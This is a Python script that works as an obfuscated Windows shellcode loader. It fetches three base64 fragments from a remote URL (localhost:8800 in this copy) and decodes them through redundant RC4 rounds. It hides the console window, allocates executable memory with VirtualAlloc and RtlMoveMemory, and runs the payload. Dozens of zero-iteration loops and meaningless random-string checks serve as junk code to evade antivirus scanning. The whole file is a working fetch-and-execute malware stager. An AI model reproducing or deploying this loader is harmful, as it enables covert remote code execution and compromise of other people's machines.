import base64
from ctypes import *
from random import choice, randint, shuffle
from string import ascii_letters

import requests
from Crypto.Cipher import ARC4
from binascii import b2a_hex, a2b_hex, Error


class Any(object):
    @staticmethod
    def g():
        _s = ascii_letters
        s = [choice(_s) for _ in range(randint(17, 37))]
        [shuffle(s) for _ in range(9)]
        return ''.join(s).encode('ascii')

    @staticmethod
    def r(k, d):
        return b2a_hex(ARC4.new(k).encrypt(d))

    @staticmethod
    def d(k, d):
        try:
            return ARC4.new(k).decrypt(a2b_hex(d))
        except Error:
            return b''


if __name__ == '__main__':
    AG = Any.g()
    windll.kernel32.VirtualAlloc.restype = c_uint64
    VirtualAlloc = windll.kernel32.VirtualAlloc
    VirtualProtect = windll.kernel32.VirtualProtect
    ConsoleWindow = windll.kernel32.GetConsoleWindow()
    RtlMoveMemory = windll.kernel32.RtlMoveMemory
    url = 'http://127.0.0.1:8800/GdkyWwIvXubnfnN'
    H = requests.get(f'{url}.0').text
    M = requests.get(f'{url}.1').text
    F = requests.get(f'{url}.2').text
    S = len(AG) % 0x0A
    R = Any.r(AG, base64.b64decode(H + M + F))
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    # -----------------------------------------
    for _ in range(S - 0x00): R = Any.r(AG, R)
    # -----------------------------------------
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    D = Any.d(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.r(AG, R)
    for _ in range(S * 0x00): Any.d(AG, D)
    # -----------------------------------------
    for _ in range(S - 0x00): D = Any.d(AG, D)
    # -----------------------------------------
    for _ in range(S * 0x01): Any.d(AG, D)
    for _ in range(S * 0x01): Any.d(AG, D)
    for _ in range(S * 0x01): Any.d(AG, D)
    for _ in range(S * 0x00): Any.d(AG, D)
    for _ in range(S * 0x00): Any.d(AG, D)
    for _ in range(S * 0x01): Any.d(AG, D)
    for _ in range(S * 0x00): Any.d(AG, D)
    for _ in range(S * 0x00): Any.d(AG, D)
    if ConsoleWindow != 0 and Any.g() != Any.g():
        if Any.g() != Any.g() and Any.g() is not None:
            windll.user32.ShowWindow(ConsoleWindow, 0)
            windll.kernel32.CloseHandle(ConsoleWindow)
    for _ in range(S * 0x01): Any.d(AG, D)
    Alloc = VirtualAlloc(c_int(0), c_int(len(D)), c_int(0x3000), c_int(0x40))
    for _ in range(S * 0x00): Any.d(AG, D)
    for _ in range(S * 0x01): Any.d(AG, D)
    buf = ARRAY(c_char, len(D)).from_buffer_copy(D)
    for _ in range(S * 0x01): Any.d(AG, D)
    old = c_long(1)
    for _ in range(S * 0x01): Any.d(AG, D)
    VirtualProtect(c_void_p(Alloc), c_int(len(D)), 0x40, byref(old))
    for _ in range(S * 0x01): Any.d(AG, D)
    RtlMoveMemory(c_void_p(Alloc), buf, c_int(len(D)))
    for _ in range(S * 0x01): Any.d(AG, D)
    RUNNER = cast(Alloc, CFUNCTYPE(c_void_p))
    for _ in range(S * 0x01): Any.d(AG, D)
    if Any.g() != Any.g() and Any.d and RUNNER.__call__():
        for _ in range(S * 0x01): Any.d(AG, D)
    for _ in range(S * 0x01): Any.d(AG, D)
